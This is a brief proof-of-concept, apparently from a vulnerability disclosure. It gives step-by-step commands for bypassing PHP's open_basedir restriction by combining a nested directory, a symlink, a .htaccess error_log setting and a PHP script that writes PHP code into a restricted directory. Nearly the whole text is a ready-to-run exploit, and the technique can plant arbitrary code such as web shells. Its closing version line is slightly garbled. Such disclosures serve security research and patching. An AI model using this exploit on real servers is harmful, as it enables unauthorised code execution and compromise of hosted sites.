Proof of Concept ================ 1. Set open_basedir as a security feature in php.ini file :    open_basedir = /var/www/html:/tmp 2. Make a directory with the name of your web server's home directory inside your web server's home directory :    mkdir -p /var/www/html/var/www/html 3. Make a symlink to a restricted writable directory inside this new directory :    ln -s /home/havijoori/www/uploads /var/www/html/var/www/html/test 4. Make a .htaccess file in your web server's root directory to set php value :    php_value error_log "var/www/html/test/hacked.php" 5. Make a PHP script, "bypass.php" in your web server's root directory to exploit the vulnerability :    <?php error_log("<?php phpinfo(); ?>"); ?> 6. Call the script :    curl http://webserver/bypass.php 7. After successful exploitation, our file "hacked.php" should be created in the restricted directory :    ls /home/havijoori/www/uploads/hacked.php  Tested with PHP and 7.x.
